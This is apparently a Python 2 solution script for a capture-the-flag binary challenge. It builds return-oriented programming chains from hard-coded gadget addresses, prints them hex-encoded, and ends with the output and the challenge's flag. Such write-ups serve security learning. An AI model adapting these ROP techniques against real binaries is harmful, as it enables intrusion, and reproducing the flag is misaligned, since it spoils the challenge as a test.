from struct import pack

def p(data) : 
	return pack('<Q',data)
	
add_rax_rbx = 0x400B30
pop_r9 = 0x4009F0
imul_rax_r9 = 0x400D30
add_rbx_rcx = 0x400F90
add_rax_r9 = 0x400D10
sub_rax_r8 = 0x400CD0
imul_rcx_r9 = 0x401550
sub_rax_rcx = 0x400B90
imul_rdx_r9 = 0x401960
add_rax_rdx = 0x400BD0
imul_rdi_rsi = 0x4020E0
imul_rdi_r9 = 0x402180

rop = p(add_rax_rbx)
rop1 = p(add_rax_rbx)+p(0x400F70)+p(0x4008B0)+p(0x4008A0)+p(1337) + p(add_rax_rbx)
rop2 = p(0x400B50)
rop3 = p(0x400900)+p(31337)+p(0x400F90)+p(0x400B50)
rop4 = p(pop_r9) + p(23)+p(imul_rax_r9)
rop4 +=p(pop_r9)+p(2015)+p(add_rax_r9)+p(add_rax_rbx)+ p(sub_rax_r8)
rop4 +=p(pop_r9)+p(41)+p(imul_rcx_r9)+p(sub_rax_rcx)
rop4 +=p(pop_r9)+p(210)+ p(imul_rdx_r9)+p(add_rax_rdx)+p(imul_rdi_rsi)+p(pop_r9)+p(42)+p(imul_rdi_r9)+p(0x400C70)

rop = rop.encode("hex")
rop1 = rop1.encode("hex")
rop2= rop2.encode("hex")
rop3= rop3.encode("hex")
rop4= rop4.encode("hex")
print rop+"\n"+rop1+"\n"+rop2+"\n"+rop3+"\n"+rop4

'''
300b400000000000
300b400000000000700f400000000000b008400000000000a0084000000000003905000000000000300b400000000000
500b400000000000
0009400000000000697a000000000000900f400000000000500b400000000000
f0094000000000001700000000000000300d400000000000f009400000000000df07000000000000100d400000000000300b400000000000d00c400000000000f00940000000000029000000000000005015400000000000900b400000000000f009400000000000d2000000000000006019400000000000d00b400000000000e020400000000000f0094000000000002a000000000000008021400000000000700c400000000000
# The flag is: CAMP15_c0342e0be22dc032de05aa637c8ee8a3
'''
